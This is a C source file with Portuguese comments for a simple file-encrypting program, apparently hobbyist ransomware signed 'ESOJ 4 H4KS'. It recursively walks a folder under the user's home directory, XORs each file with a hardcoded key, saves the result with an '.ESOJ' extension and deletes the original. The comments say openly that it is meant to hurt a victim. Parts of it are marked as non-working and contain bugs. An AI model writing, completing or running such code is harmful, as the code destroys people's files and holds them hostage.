/*
 * C Program to List Files in Directory
 */
#include <dirent.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <math.h>
#include <string.h>
#include "listdir.h"
#include <sys/types.h>
#include <errno.h>
#include <dirent.h>
#include <limits.h>


#define TAMANHO_CHAVE   16      /*tamanho da chave em bytes ,padrao 2**256 para quando ela for gerada automaticamente*/
#define TAMANHO_BUFFER  4096 

#ifndef MAX_PATH
#define     MAX_PATH    2048
#endif
/*dá o home do usuario pra fuder o infeliz*/
char *get_homedir(void)
{
    char homedir[MAX_PATH];
#ifdef _WIN32
    snprintf(homedir, MAX_PATH, "%s%s", getenv("HOMEDRIVE"), getenv("HOMEPATH"));
#else
    snprintf(homedir, MAX_PATH, "%s", getenv("HOME"));
#endif
    return strdup(homedir);
}
/*ROUBADO - peguei o primeiro codigo q printava o nome completo dos arquivos dado um diretorio*/
void recursiveWalk(const char *pathName, int level,char *chave) {
   DIR *dir;
   struct dirent *entry;
   char globalPath[1000];

   if (!(dir = opendir(pathName))) {
      fprintf(stderr, "Could not open directory\n");
      return;
   }

   if (!(entry = readdir(dir))) {
      fprintf(stderr, "Could not read directory\n");
      return;
   }

   do {
      char path[1024];
      int len = snprintf(path, sizeof(path)-1, "%s/%s", pathName, entry->d_name); // get depth
      // path[len] = 0;
      if (entry->d_type == DT_DIR) { // found subdirectory


         // skip hidden paths
         if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
         }

          snprintf(globalPath,1000, "%s\\%s", pathName, entry->d_name);//, level);
          //fprintf(stdout, "%s ",globalPath);
         CifrarArquivo(globalPath,chave);
         // Append fullPath to entry->d_name here

         recursiveWalk(path, level + 1,chave);
      }
      else { // files
         //fprintf(stdout, "%s (%d)\n", path, level);
        snprintf(globalPath,1000, "%s\\%s", pathName, entry->d_name);
        //fprintf(stdout, "%s\n",globalPath);
        CifrarArquivo(globalPath,chave);
            //CifrarArquivo(char * nome,char chave[TAMANHO_CHAVE]);
         //changeFile(fullPath);
      }
   } while ((entry = readdir(dir)));

   closedir(dir);
}
    /*


                CODED BY  E S O J     4   H 4 K S




    */

/*é chamada pela funçao de baixo, o windows tem alguns problemas com a rand ao meu ver*/
unsigned char GerarAleatorio(int tamanhoMaximo)
{
    int r,a,b;
    srand((unsigned)time(NULL));
    for(a=0;a<20;a++)
        r+=rand();
    
    return r;
}
/*só ativa se vc quiser fuder alguem*/
unsigned char* GerarChaveAleatoria(int tamanhoBytes,char *chave)
{
    
    unsigned indice;
    for (indice=0;indice<tamanhoBytes;indice++)
        chave[indice]=GerarAleatorio(255);
    return 0;
}
/*menina dos olhos de ouro 2, encripta um arquivo todo*/
int
CifrarArquivo(char * nome,char chave[TAMANHO_CHAVE])
{
    //printf("encriptando %s \n",nome);
    FILE *leitura;
    FILE *escrita;
    char buffer[TAMANHO_BUFFER+1];
    size_t lidos;
    size_t escritos;
    int erro;

    char novoNome[2048];
    strcpy(novoNome,nome);
    strcat(novoNome,".ESOJ");
    if(!(leitura=fopen(nome,"r+b")))
    {
        printf("%s\n","Erro ao abrir arquivo de leitura" );
        return 1;
    }
    if(!(escrita=fopen(novoNome,"w+b")))
    {
        printf("%s\n","erro abrir arquivo escrita" );
        return 2;
    }

    //printf("debug novo nome=%s\n",novoNome);

    while((lidos=fread((void *)buffer,1,TAMANHO_BUFFER,leitura))>0)
    {
        //printf("lidos=%i\n,%s",(int)lidos,buffer);
        fwrite((void *)buffer,lidos,1,stdout);
        //printf("coisas lidas=\'%s\'\n",lidos);
        CryptBuffer(buffer,chave,lidos);
        escritos=fwrite((void *)buffer,lidos,1,escrita);



    }
    fclose(leitura);
    fclose(escrita);
    remove(nome);
}
/*menina dos olhos de ouro, tem como objetivo encriptar um buffer todo */
int
CryptBuffer(char buffer[TAMANHO_BUFFER],char chave[TAMANHO_CHAVE],size_t tamanhoBinario)
{
    unsigned indice;
    unsigned indiceChave=0;
    char buffer2;
    //printf("chegou na crypr: buffer %s",buffer);
    for (indice=0;indice<tamanhoBinario;indice++)
    {
        
        buffer[indice]=(buffer[indice]^chave[indiceChave]);
        if(indiceChave==(TAMANHO_CHAVE-1))
            indiceChave=0;
        else
            indiceChave++;
    }
    return 0;
}
/*NAO USEI E NAO FUNCIONA*/
int
ConverterChave(unsigned char chave[TAMANHO_CHAVE],char *leitura)
{
    char buffer[5];
    char saida[200];
    unsigned char indice;
    for(indice=0;indice<TAMANHO_CHAVE;indice++)
    {
        //printf("chave indx: %i \n",(unsigned int)chave[indice]);
        snprintf(buffer,5,"%i:",(unsigned int)chave[indice]);
        strcat(saida,buffer);
    }
    //printf("ao fim da conversao, buffer:%s\n saida=%s",buffer,saida);
    strcpy(leitura,saida);
    return 0;
}

/*NAO FOI USADA NEM FUNCIONA*/
int
DesconverterChave(unsigned char chave[TAMANHO_CHAVE],unsigned char *leitura)
{
    unsigned char buffer;
    unsigned char saida[TAMANHO_CHAVE];
    unsigned char indice;
    unsigned char *token;
    token=strtok(leitura,":");
    for(indice=0;indice<TAMANHO_CHAVE;indice++)
    {
        printf("token=%s",token);
        buffer=atoi(token);
        saida[indice]=buffer;
        token=strtok(NULL,":");
    }
    strcpy(leitura,saida);
    printf("saida:\'%s\'\n",saida);
    return 0;
}
int
main(void)
{   
    size_t tempo = time(NULL);
    size_t tempoFinal;
    printf("%s\n","iniciando programa" );
    //char random[TAMANHO_CHAVE];
    char chave[TAMANHO_CHAVE+1];
    char leitura[200];

    //GerarChaveAleatoria(TAMANHO_CHAVE,random);
    //random=NkxieI6kutDm/BIoPlRqgA==
    //rintf("\nchave random: \'%s\'\n",random );

    //char myb64[1024] = "";
    //char mydst[1024] = "";

    //b64_encode(random, myb64);
    //printf("The string\n[%s]\nencodes into base64 as:\n[%s]\n", random, myb64);
  
    //em caso do seu ultimo recurso ser um print da chave no terminal..
    char *base64Key="NkxieI6kutDm/BIoPlRqgA==";
    b64_decode(base64Key, chave);
    

      
    //CifrarArquivo("lorem.txt",chave);

    printf("The string base64Key\n[%s]\ndecodes from base64 as:\n[%s]\n", base64Key, chave);
    //POE O DIRETORIO AQUI
    char homedir[2048];
    strcpy(homedir,get_homedir());
    strcat(homedir,"\\Documents\\kali");

    recursiveWalk(homedir, 0,chave);
    tempoFinal=(time(NULL)-tempo);
    printf("A operacao durou %lu\n",tempoFinal);

    return 0;
}
